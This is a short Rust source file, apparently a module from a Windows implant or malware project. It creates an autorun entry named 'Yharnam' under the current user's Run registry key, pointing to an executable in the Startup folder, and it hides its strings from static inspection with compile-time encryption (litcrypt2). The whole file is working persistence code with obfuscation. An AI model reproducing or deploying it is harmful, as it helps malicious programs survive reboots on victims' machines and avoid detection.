use litcrypt2::lc;
use std::io;
use windows_registry::*;

pub fn registry() -> io::Result<()> {
    let exe =
        lc!("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Yharnam.exe");
    let key = CURRENT_USER.create(lc!("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))?;

    key.set_string("Yharnam", exe)?;

    Ok(())
}
